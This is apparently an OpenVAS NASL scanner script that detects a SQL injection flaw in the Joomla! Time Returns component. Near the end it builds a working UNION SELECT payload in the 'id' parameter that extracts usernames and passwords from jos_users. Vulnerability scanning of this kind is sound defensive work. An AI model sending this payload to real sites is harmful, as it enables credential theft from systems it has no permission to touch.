##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_time_returns_id_param_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla! Time Returns Component 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to cause SQL Injection attack and
  gain sensitive information.
  Impact Level: Application";
tag_affected = "Joomla! Time Returns Component Version 2.0";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the 'id'
  parameter to index.php (when 'option' is set to 'com_timereturns' and 'view'
  is set to 'timereturns'), which allows attacker to manipulate SQL queries by
  injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 28th October 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to
  http://www.takeaweb.it/index.php?option=com_dms&view=category&layout=table&Itemid=13";
tag_summary = "This host is running Joomla! Time Returns component and is prone to
  SQL injection vulnerability.";

if(description)
{
  script_id(902584);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-10-28 16:17:13 +0200 (Fri, 28 Oct 2011)");
  script_bugtraq_id(50026);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Joomla! Time Returns Component 'id' Parameter SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/76268");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46267");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50026");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17944");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/105619/joomlatimereturns-sql.txt");

  script_description(desc);
  script_summary("Check if Joomla! Time Returns component is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Joomla Directory
if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

## Construct the Attack Request
url = string(dir, "/index.php?option=com_timereturns&view=timereturns&id=7+",
             "union+all+select+concat_ws(0x6f7674657374,0x3a,username,0x3a,",
             "password,0x3a,0x6f7674657374),2,3,4,5,6+from+jos_users--");

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, pattern:'ovtest:.*:.*:ovtest',
                   check_header: TRUE)){
  security_hole(port);
}
